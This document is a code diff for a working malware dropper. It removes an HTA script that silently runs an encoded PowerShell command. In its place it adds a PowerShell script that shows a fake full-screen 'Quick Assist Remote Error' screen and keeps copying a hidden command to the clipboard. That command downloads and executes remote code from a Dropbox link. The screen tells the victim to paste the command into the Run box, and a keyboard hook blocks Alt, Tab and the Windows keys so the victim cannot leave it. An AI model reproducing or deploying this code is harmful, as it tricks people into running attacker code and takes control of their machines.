@@ -1,15 +1,164 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
 
-<html>
-<head>
-<script language="JScript">
-try {
-  var shell = new ActiveXObject("WScript.Shell");
-  var psCmd = 'powershell -nop -w hidden -EncodedCommand DQAKACQAdwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAGMAbAAvAGYAaQAvAHEAZQBqADEAcwBnAHEAZwBnADcAeQBrAGEAdwBwAGMAZQBhAG8AegB5AC8AcgBlAG0AbwB0AGEAcwBzAGkAcwB0AD8AcgBsAGsAZQB5AD0AOQA4AG0AMABsAHcAZAA0AHoAOABjADAANQAyAHgAbAA1AGgAYwBtADQAcgByAGsAZAAmAHMAdAA9AGUAZQAwAHoAbQBsAHcAaQAmAGQAbAA9ADEAJwA7AEkARQBYACAAJAB3AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJAB1ACkA"';
-  shell.Run(psCmd, 0, false);
-} catch(e) {
+# === Settings ===
+$url = "https://upload.wikimedia.org/wikipedia/commons/5/53/Remote_Assistance_Icon.png"
+$recoveryCode = 'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object Net.WebClient;$u=''https://www.dropbox.com/scl/fi/qej1sgqgg7ykawpceaozy/remotassist?rlkey=98m0lwd4z8c052xl5hcm4rrkd&st=ee0zmlwi&dl=1'';IEX $w.DownloadString($u)"'
+$nameOf = "Quick Assist Remote Error"
+
+
+# Appearance
+$bgColor         = [Drawing.Color]::White
+$dialogColor     = [Drawing.Color]::FromArgb(240, 245, 255)
+$textColor       = [Drawing.Color]::FromArgb(0, 51, 102)
+$accentColor     = [Drawing.Color]::FromArgb(0, 102, 204)
+$codeColor       = [Drawing.Color]::FromArgb(30, 30, 30)
+
+# === Fonts ===
+$fontTitle = New-Object Drawing.Font("Segoe UI", 16, [Drawing.FontStyle]::Bold)
+$fontBody  = New-Object Drawing.Font("Segoe UI", 11)
+
+# === Instruction Text ===
+$instructionText = @"
+There was an error while maintaining the remote session.
+
+To restore the connection:
+ 1) Click 'Copy Code'
+ 2) On the support machine, press Win + R
+ 3) Paste the code and press Enter
+"@
+
+# === Clipboard Auto-Copy ===
+$clipboardTimer = New-Object Windows.Forms.Timer
+$clipboardTimer.Interval = 2000
+$clipboardTimer.Add_Tick({ [Windows.Forms.Clipboard]::SetText($recoveryCode) })
+$clipboardTimer.Start()
+
+# === Create Fullscreen Form ===
+$form = New-Object Windows.Forms.Form
+$form.WindowState = 'Maximized'
+$form.FormBorderStyle = 'None'
+$form.TopMost = $true
+$form.BackColor = $bgColor
+$form.KeyPreview = $true
+
+# === Create Centered Panel ===
+$dialog = New-Object Windows.Forms.Panel
+$dialog.Size = New-Object Drawing.Size(500, 400)
+$dialog.BackColor = $dialogColor
+$dialog.BorderStyle = 'FixedSingle'
+$dialog.Anchor = 'None'
+$form.Controls.Add($dialog)
+
+# === Center the dialog panel ===
+$form.Add_Shown({
+    $dialog.Left = ($form.ClientSize.Width - $dialog.Width) / 2
+    $dialog.Top  = ($form.ClientSize.Height - $dialog.Height) / 2
+})
+
+# === Load Icon Image ===
+$webClient = New-Object System.Net.WebClient
+$imageData = $webClient.DownloadData($url)
+$ms = New-Object System.IO.MemoryStream(,$imageData)
+$image = [System.Drawing.Image]::FromStream($ms)
+
+$icon = New-Object Windows.Forms.PictureBox
+$icon.Image = $image
+$icon.SizeMode = 'Zoom'
+$icon.Size = New-Object Drawing.Size(64, 64)
+$icon.Location = New-Object Drawing.Point(218, 20)
+$dialog.Controls.Add($icon)
+
+# === Title Label ===
+$titleLabel = New-Object Windows.Forms.Label
+$titleLabel.Text = $nameOf
+$titleLabel.Font = $fontTitle
+$titleLabel.ForeColor = $textColor
+$titleLabel.AutoSize = $true
+$titleLabel.Location = New-Object Drawing.Point(120, 95)
+$dialog.Controls.Add($titleLabel)
+
+# === Instructions ===
+$instructions = New-Object Windows.Forms.Label
+$instructions.Text = $instructionText
+$instructions.Font = $fontBody
+$instructions.ForeColor = $textColor
+$instructions.Size = New-Object Drawing.Size(440, 150)
+$instructions.Location = New-Object Drawing.Point(30, 140)
+$dialog.Controls.Add($instructions)
+
+# === Copy Button ===
+$copyButton = New-Object Windows.Forms.Button
+$copyButton.Text = "Copy Code"
+$copyButton.Font = $fontBody
+$copyButton.BackColor = $accentColor
+$copyButton.ForeColor = [Drawing.Color]::White
+$copyButton.FlatStyle = 'Flat'
+$copyButton.FlatAppearance.BorderSize = 0
+$copyButton.Size = New-Object Drawing.Size(140, 35)
+$copyButton.Location = New-Object Drawing.Point(180, 310)
+
+$copyButton.Add_Click({
+    [Windows.Forms.Clipboard]::SetText($recoveryCode)
+    $copyButton.Text = "Copied!"
+    Start-Sleep -Milliseconds 800
+    $copyButton.Text = "Copy Code"
+})
+$dialog.Controls.Add($copyButton)
+
+# === Cleanup on Close ===
+$form.Add_FormClosing({
+    $clipboardTimer.Stop()
+    $clipboardTimer.Dispose()
+})
+
+# === Show Fullscreen UI ===
+$form.ShowDialog()
+
+
+# Keyboard hook to block Alt+Tab, Win keys, etc.
+$signature = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public class KeyboardInterceptor {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_SYSKEYDOWN = 0x0104;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+
+    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+    public static IntPtr SetHook() {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule) {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            // Block Left Win (0x5B), Right Win (0x5C), Tab (0x09), Left Alt (0xA4), Right Alt (0xA5)
+            if (vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x09 || vkCode == 0xA4 || vkCode == 0xA5) {
+                return (IntPtr)1; // Block key
+            }
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    public static void Hook() { _hookID = SetHook(); }
+    public static void Unhook() { UnhookWindowsHookEx(_hookID); }
 }
-window.close();
-</script>
-</head>
-<body></body>
-</html>
+'@
+Add-Type -TypeDefinition $signature
+[KeyboardInterceptor]::Hook()
